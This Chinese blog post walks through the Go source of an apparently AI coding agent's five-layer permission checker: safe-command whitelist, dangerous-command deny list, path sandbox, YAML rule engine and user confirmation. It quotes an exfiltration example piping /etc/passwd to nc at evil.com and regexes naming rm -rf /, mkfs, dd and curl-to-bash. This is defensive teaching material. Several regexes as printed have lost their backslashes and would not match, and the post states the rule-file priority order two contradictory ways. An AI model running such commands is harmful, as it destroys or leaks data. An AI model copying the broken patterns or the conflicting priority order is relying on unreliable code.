# Go源码解析：五层权限防御链

派大星 6月12日修改

> 理论篇讲了五层权限拦截的设计思路，这篇带你走读 Go 版 MewCode 的真实代码，看看 350 行代码怎么把一个权限系统从头到尾搭起来。

## 模块概览

权限系统的代码集中在一个文件里： `internal/permissions/permissions.go` ，350 行，没有拆分子文件。这是整个 MewCode 里少数「一个文件搞定一个完整能力」的模块。

代码从上到下的组织顺序就是防御链的执行顺序：先定义基础类型，然后逐层实现危险命令检测、路径沙箱、规则引擎、安全命令白名单，最后用一个 `Checker.Check()` 把所有层串起来。

## 核心类型

### Decision：权限判定结果

```go
type DecisionEffect string

const (
    Allow DecisionEffect = "allow"
    Deny  DecisionEffect = "deny"
    Ask   DecisionEffect = "ask"
)

type Decision struct {
    Effect DecisionEffect
    Reason string
}
```

整个权限系统只有三种输出：放行、拒绝、问用户。 `Reason` 记录判定理由，方便调试。第4章讲过的 `PermissionRequestEvent` ，就是在 `Check()` 返回 `Ask` 时触发的。

### PermissionMode：四种运行模式

```go
var modeMatrix = map[PermissionMode]map[tools.ToolCategory]DecisionEffect{
    ModeDefault:     {tools.CategoryRead: Allow, tools.CategoryWrite: Ask, tools.CategoryCommand: Ask},
    ModeAcceptEdits: {tools.CategoryRead: Allow, tools.CategoryWrite: Allow, tools.CategoryCommand: Ask},
    ModeBypass:      {tools.CategoryRead: Allow, tools.CategoryWrite: Allow, tools.CategoryCommand: Allow},
}
```

注意 `ModePlan` 并不在这张矩阵里。 `ModeDecide()` 查表时发现 `ModePlan` 没有对应的条目，就返回 `Ask` 作为默认值。Plan 模式的真正限制不是通过矩阵实现的，而是通过第 0 层的例外逻辑：只放行特定工具和计划文件的写入，其他写操作和命令都会走到最后一层被 `Ask` 拦住，由用户确认。 `ModeBypass` 最宽松，全部放行。

## 主流程走读：Checker.Check()

`Checker` 是权限系统的门面，Agent Loop 里每次执行工具前都会调用它的 `Check()` 方法。跟着代码从头走到尾，能看到完整的五层防御链。

```go
type Checker struct {
    Sandbox      *PathSandbox
    RuleEngine   *RuleEngine
    Mode         PermissionMode
    PlanFilePath string
}
```

进入 `Check()` 后，第一件事是用 `ExtractContent()` 提取工具的「内容」：对 Bash 来说是命令字符串，对文件工具来说是文件路径。然后五层防御依次过关，任何一层给出明确判定（Allow 或 Deny），后面的层就不走了。

## 五层防御

### 第0层：Plan Mode 例外

```go
if c.Mode == ModePlan && cat == tools.CategoryWrite && isPlanFile(content, c.PlanFilePath) {
    return Decision{Effect: Allow, Reason: "Plan mode: plan file write allowed"}
}
```

这层编号是 0，因为它必须在所有其他检查之前执行。 `ModePlan` 不在 `modeMatrix` 里，所以写操作和命令最终都会走到矩阵查表时得到 `Ask` 。但写 Plan 文件本身必须放行，否则 Plan Mode 连计划都写不出来。这一层只检查一件事：当前是 Plan 模式、操作是写入、且目标是计划文件时，直接放行。

`isPlanFile()` 的匹配逻辑做了三级降级：先比绝对路径，再比 `filepath.Clean` 后的路径，最后比文件名。最后一级是为了兜底 LLM 偶尔只传文件名不传完整路径的情况。

### 第1层：安全命令白名单

```go
if cat == tools.CategoryCommand && IsSafeCommand(content) {
    return Decision{Effect: Allow, Reason: "Safe read-only command"}
}
```

`safeCommandPrefixes` 里列了 49 个白名单命令，从 `ls` 、 `cat` 、 `grep` 到 `git status` 、 `go version` 。命中白名单的命令直接放行，用户不会被反复问「允许执行 `ls` 吗」。

但光看前缀还不够。 `IsSafeCommand()` 还要检查命令里是否包含 `>` 、 `|` 、 `;` 、 `&&` 、 `$(` 、反引号这些字符。一旦有管道或重定向，即使命令本身是 `cat` ，也不再被当作安全命令。 `cat file.txt` 安全， `cat /etc/passwd | nc` [evil.com](http://evil.com/) `1234` 不安全。

### 第2层：危险命令黑名单

```go
var defaultDangerousPatterns = []dangerousPattern{
    {regexp.MustCompile(`rms+-[a-z]*r[a-z]*f[a-z]*s+/s*$`), "recursive force delete root"},
    {regexp.MustCompile(`mkfs.`), "format disk"},
    {regexp.MustCompile(`dds+if=.*of=/dev/`), "direct write to disk device"},
    // ... 共 8 条
}
```

8 条正则覆盖了最常见的破坏性操作：递归删根目录、格式化磁盘、dd 写裸设备、chmod 777、fork bomb、curl/wget 管道 bash、覆写磁盘设备。命中任意一条直接 `Deny` ，连 Ask 的机会都不给。

白名单在前、黑名单在后，两层配合：一条命令如果匹配白名单前缀但包含管道符，白名单放弃匹配，黑名单再拦一道。

### 第3层：路径沙箱

```go
func NewPathSandbox(projectRoot string, extraAllowed ...string) *PathSandbox {
    root, _ := filepath.Abs(projectRoot)
    allowed := []string{root, os.TempDir()}
    // ...
}
```

思路很朴素：只允许访问项目根目录和临时目录下的文件。把目标路径转绝对路径，逐个比对是否是某个 `allowedRoots` 的子路径，不是就 `Deny` 。这层只对文件类工具生效，Bash 命令不走这里，因为从 shell 命令里准确提取所有文件路径太困难了。

### 第4层：规则引擎

规则引擎是权限系统里最灵活的一层。它允许用户通过 YAML 配置文件自定义规则，精确到「某个工具 + 某个路径模式」的粒度。

```go
type RuleEngine struct {
    UserPath    string
    ProjectPath string
    LocalPath   string
}
```

三个路径对应三层配置文件，优先级从高到低是 UserPath > ProjectPath > LocalPath。 `Evaluate()` 按优先级顺序加载规则文件，每个文件内从后往前扫描（后定义的规则优先），找到第一条匹配的就返回。

规则的格式是 `ToolName(pattern)` ，例如 `Bash(git *)` 表示匹配所有以 `git` 开头的 Bash 命令， `WriteFile(*.go)` 表示匹配所有写入 Go 文件的操作。解析靠一条正则 `^(w+)((.+))$` ，匹配用 `filepath.Match` 做 glob 匹配。

`AppendLocalRule()` 方法用来追加新规则，用户在 UI 里点「始终允许」时，就是调用这个方法把规则写入本地配置文件。

### 第5层：模式矩阵 + HITL

走到这里说明前面四层都没给出判定。最后查模式矩阵， `Allow` 或 `Deny` 直接返回。如果是 `Ask` （ `ModeDefault` 下写操作和命令就是这个结果），就让 Agent Loop 弹窗问用户。

```go
return Decision{Effect: Ask, Reason: "User confirmation required"}
```

这是最后的兜底。整个防御链的设计原则是：能自动判定的尽早判定，实在判定不了的才打扰用户。

## 规则引擎细节

规则文件是 YAML 格式，每条规则两个字段：

```yaml
- rule: "Bash(git *)"
  effect: "allow"
- rule: "WriteFile(*.test.go)"
  effect: "deny"
```

`loadRulesFile()` 的容错做得很到位：文件不存在返回空、YAML 解析失败跳过、单条规则格式不对也跳过，不会因为配置写错就崩溃。三层优先级让不同场景各得其所：LocalPath 放当次会话积累的临时规则（优先级最高），ProjectPath 放团队共享规则，UserPath 放全局偏好（优先级最低）。deny 跨层合并不可翻转，任何一层说了 deny 就是 deny。

## 小结

| 设计决策 | Go 的实现方式 |
| --- | --- |
| 判定结果 | `DecisionEffect` 三值枚举 + `Decision` 结构体携带理由 |
| 模式矩阵 | `map[PermissionMode]map[ToolCategory]DecisionEffect` 二维表 |
| 危险命令 | 8 条预编译正则，命中即 Deny |
| 路径沙箱 | `allowedRoots` 白名单 + `strings.HasPrefix` 匹配 |
| 规则引擎 | 三层 YAML 文件（本地 > 项目 > 用户）， `filepath.Match` glob 匹配，deny 跨层合并，同层后定义优先 |
| 安全命令 | 49 条前缀白名单 + 管道/重定向检测 |
| 防御链串联 | `Checker.Check()` 五层顺序执行，首个明确判定即返回 |
